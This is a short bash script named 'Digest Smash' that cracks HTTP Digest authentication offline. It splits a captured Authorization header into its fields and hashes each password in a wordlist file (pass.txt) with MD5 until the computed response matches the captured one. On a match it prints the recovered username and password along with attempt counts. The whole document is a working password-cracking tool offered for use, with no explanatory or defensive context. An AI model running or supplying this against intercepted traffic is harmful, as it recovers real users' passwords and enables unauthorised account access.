#!/bin/bash
# Run Digest Smash
str="$*"
IFS=', ' read -r -a array <<< $str
for index in "${!array[@]}"
do
 echo "$index ${array[index]}"
done

var1=$(echo ${array[1]} | cut -f2 -d=)
var2=$(echo ${array[2]} | cut -f2 -d=)
var4=$(echo ${array[4]} | cut -f2 -d=)
HA2=`echo -n "GET:$var4" | md5`
var5=$(echo ${array[3]} | cut -f2 -d=)
var6=$(echo ${array[8]} | cut -f2 -d=)
var7=$(echo ${array[7]} | cut -f2 -d=)
var8=$(echo ${array[9]} | cut -f2 -d=)
check1=$(echo ${array[5]} | cut -f2 -d=)
i=0
j=0
x=0
while read p; do
 ((i++))
 var3="$p"
 HA1=`echo -n "$var1:$var2:$var3" | md5`
 Response1=`echo -n "$HA1:$var5:$var6:$var7:$var8:$HA2" | md5`
 if [ $Response1 = $check1 ];
  then
   ((x++))
   echo
   echo $str
   echo
   echo "username: $var1"
   echo "password: $var3"
   echo
   echo "Attempts: $i, Fails: $j, Pass: $x"
   exit 0
  else 
   ((j++))
 fi
done <pass.txt

